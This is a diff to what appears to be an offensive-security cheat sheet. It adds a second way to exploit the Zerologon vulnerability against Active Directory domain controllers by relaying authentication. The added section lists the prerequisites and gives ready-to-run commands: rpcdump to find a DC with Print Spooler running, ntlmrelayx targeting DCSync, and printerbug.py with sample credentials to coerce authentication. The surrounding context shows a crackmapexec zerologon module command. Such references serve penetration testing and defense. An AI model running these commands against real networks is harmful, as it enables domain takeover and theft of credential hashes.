@@ -661,6 +661,26 @@ Exploit steps from the white paper
   ```powershell
   crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
   ```
+  
+A 2nd approach to exploit zerologon is done by relaying authentication.
+
+This technique, [found by dirkjanm](https://dirkjanm.io/a-different-way-of-abusing-zerologon), requires more prerequisites but has the advantage of having no impact on service continuity.
+The following prerequisites are needed:
+* A domain account
+* One DC running the `PrintSpooler` service
+* Another DC vulnerable to zerologon
+
+* `ntlmrelayx` - from Impacket and any tool such as [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
+  ```powershell
+  # Check if one DC is running the PrintSpooler service
+  rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"
+  
+  # Setup ntlmrelay in one shell
+  ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
+  
+  #Trigger printerbug in 2nd shell
+  python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
+  ```
 
 #### PrintNightmare
 
